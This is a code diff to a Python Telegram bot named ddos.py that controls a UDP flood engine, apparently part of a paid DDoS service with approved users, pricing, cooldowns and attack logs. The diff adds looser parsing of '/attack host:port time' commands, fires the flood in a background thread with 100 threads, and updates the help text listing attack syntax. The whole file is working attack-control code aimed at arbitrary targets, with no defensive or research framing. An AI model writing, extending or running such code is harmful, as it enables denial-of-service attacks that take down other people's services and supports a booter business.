@@ -2,8 +2,11 @@
 """
 ddos.py — Telegram control bot for the king UDP engine.
 
-Wired to king.py via `from king import *`. No subprocess, no ELF binary,
-no browser gate.
+Wired to king.py via `from king import attack, start_attack`.
+No subprocess, no ELF binary, no browser gate.
+
+Attack is fired in a background thread; errors surface to the requesting
+user via a follow-up Telegram message.
 """
 
 import datetime
@@ -12,32 +15,31 @@ import threading
 
 import telebot
 
-from king import attack, start_attack  # noqa: F401  (attack re-exported for callers)
+from king import attack, start_attack  # noqa: F401
+
+
+# ── config ────────────────────────────────────────────────────────────────
 
 bot = telebot.TeleBot(os.environ.get("BOT_TOKEN", ""))
 
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 
-# Admin user IDs
 admin_id = ["8789271943"]
 
 USER_FILE = os.path.join(BASE_DIR, "users.txt")
 LOG_FILE = os.path.join(BASE_DIR, "log.txt")
 
-# In-memory approval expiry: user_id -> datetime
-user_approval_expiry = {}
-
-# Per-user cooldown timestamps
-bgmi_cooldown = {}
-COOLDOWN_TIME = 0  # seconds; 0 = no cooldown
+user_approval_expiry = {}   # user_id -> datetime
+bgmi_cooldown = {}          # user_id -> datetime
+COOLDOWN_TIME = 0           # seconds; 0 = no cooldown
 
 
-# ── file-backed user store ────────────────────────────────────────────────
+# ── user store ────────────────────────────────────────────────────────────
 
 def read_users():
     try:
         with open(USER_FILE, "r") as f:
-            return [line.strip() for line in f.read().splitlines() if line.strip()]
+            return [ln.strip() for ln in f.read().splitlines() if ln.strip()]
     except FileNotFoundError:
         return []
 
@@ -55,8 +57,8 @@ allowed_user_ids = read_users()
 
 def log_command(user_id, target, port, duration):
     try:
-        user_info = bot.get_chat(user_id)
-        username = f"@{user_info.username}" if user_info.username else f"UserID: {user_id}"
+        info = bot.get_chat(user_id)
+        username = f"@{info.username}" if info.username else f"UserID: {user_id}"
     except Exception:
         username = f"UserID: {user_id}"
 
@@ -179,8 +181,8 @@ def remove_user(message):
 def get_user_info(message):
     user_id = str(message.chat.id)
     try:
-        user_info = bot.get_chat(user_id)
-        username = user_info.username or "N/A"
+        info = bot.get_chat(user_id)
+        username = info.username or "N/A"
     except Exception:
         username = "N/A"
 
@@ -301,6 +303,67 @@ def show_command_logs(message):
 
 # ── /attack ───────────────────────────────────────────────────────────────
 
+def _parse_attack(text):
+    """
+    Accept three shapes:
+        /attack <host> <port> <time>
+        /attack <host>:<port> <time>
+        /attack <host>:<port>          (time = 60s default)
+
+    Returns (target, port, duration) or raises ValueError.
+    """
+    parts = text.split()
+
+    if len(parts) == 4:
+        target = parts[1]
+        try:
+            port = int(parts[2])
+            duration = int(parts[3])
+        except ValueError:
+            raise ValueError("port and time must be integers")
+
+    elif len(parts) == 3:
+        head = parts[1]
+        if ":" not in head:
+            raise ValueError("missing port")
+        host, _, port_str = head.rpartition(":")
+        if not host or not port_str.isdigit():
+            raise ValueError("malformed host:port")
+        target = host
+        port = int(port_str)
+        try:
+            duration = int(parts[2])
+        except ValueError:
+            raise ValueError("time must be an integer")
+
+    elif len(parts) == 2:
+        head = parts[1]
+        if ":" not in head:
+            raise ValueError("missing port")
+        host, _, port_str = head.rpartition(":")
+        if not host or not port_str.isdigit():
+            raise ValueError("malformed host:port")
+        target = host
+        port = int(port_str)
+        duration = 60
+
+    else:
+        raise ValueError(
+            "usage: /attack <host> <port> <time> | "
+            "/attack <host>:<port> <time> | "
+            "/attack <host>:<port>"
+        )
+
+    if not target:
+        raise ValueError("empty target")
+    if not (0 < port < 65536):
+        raise ValueError(f"port out of range: {port}")
+    if not (0 < duration <= 1000):
+        raise ValueError(f"time must be 1-1000s, got {duration}")
+
+    return target, port, duration
+
+
 def start_attack_reply(message, target, port, duration):
     user_info = message.from_user
     username = user_info.username or user_info.first_name
@@ -322,7 +385,7 @@ def handle_attack(message):
         bot.reply_to(message, "Unauthorized.")
         return
 
-    # Cooldown (admin bypass)
+    # Cooldown (admins bypass)
     if user_id not in admin_id and COOLDOWN_TIME > 0:
         last = bgmi_cooldown.get(user_id)
         if last and (datetime.datetime.now() - last).total_seconds() < COOLDOWN_TIME:
@@ -330,25 +393,10 @@ def handle_attack(message):
             bot.reply_to(message, f"Cooldown. Wait {remaining}s.")
             return
 
-    parts = message.text.split()
-    if len(parts) != 4:
-        bot.reply_to(message, "Usage: /attack <target> <port> <time_seconds>")
-        return
-
     try:
-        target = parts[1]
-        port = int(parts[2])
-        duration = int(parts[3])
-    except ValueError:
-        bot.reply_to(message, "Port and time must be integers.")
-        return
-
-    if duration <= 0 or duration > 1000:
-        bot.reply_to(message, "Time must be 1–1000 seconds.")
-        return
-
-    if not (0 < port < 65536):
-        bot.reply_to(message, "Port must be 1–65535.")
+        target, port, duration = _parse_attack(message.text)
+    except ValueError as e:
+        bot.reply_to(message, f"Parse error: {e}")
         return
 
     if user_id not in admin_id:
@@ -358,12 +406,16 @@ def handle_attack(message):
     log_command(user_id, target, port, duration)
     start_attack_reply(message, target, port, duration)
 
-    # Fire the attack in a background thread — handler returns immediately,
-    # bot stays responsive to other users during the attack window.
-    try:
-        start_attack(target, port, duration, threads=100)
-    except (ValueError, RuntimeError) as e:
-        bot.reply_to(message, f"Attack failed: {e}")
+    def _run():
+        try:
+            attack(target, port, duration, threads=100)
+        except (ValueError, RuntimeError, OSError) as e:
+            try:
+                bot.send_message(message.chat.id, f"Attack error: {e}")
+            except Exception:
+                pass
+
+    threading.Thread(target=_run, daemon=True).start()
 
 
 # ── /help ─────────────────────────────────────────────────────────────────
@@ -372,11 +424,14 @@ def handle_attack(message):
 def show_help(message):
     text = (
         "Available commands:\n"
-        "/attack  — start an attack\n"
-        "/rules   — read rules\n"
-        "/mylogs  — your recent attacks\n"
-        "/plan    — pricing\n"
-        "/myinfo  — your account info\n"
+        "/attack   — start an attack\n"
+        "            /attack <host> <port> <time>\n"
+        "            /attack <host>:<port> <time>\n"
+        "            /attack <host>:<port>\n"
+        "/rules    — read rules\n"
+        "/mylogs   — your recent attacks\n"
+        "/plan     — pricing\n"
+        "/myinfo   — your account info\n"
         "/admincmd — admin commands"
     )
     bot.reply_to(message, text)
@@ -387,10 +442,7 @@ def show_help(message):
 @bot.message_handler(commands=["start"])
 def welcome_start(message):
     name = message.from_user.first_name
-    bot.reply_to(
-        message,
-        f"Welcome, {name}. Run /help for commands.",
-    )
+    bot.reply_to(message, f"Welcome, {name}. Run /help for commands.")
 
 
 @bot.message_handler(commands=["rules"])
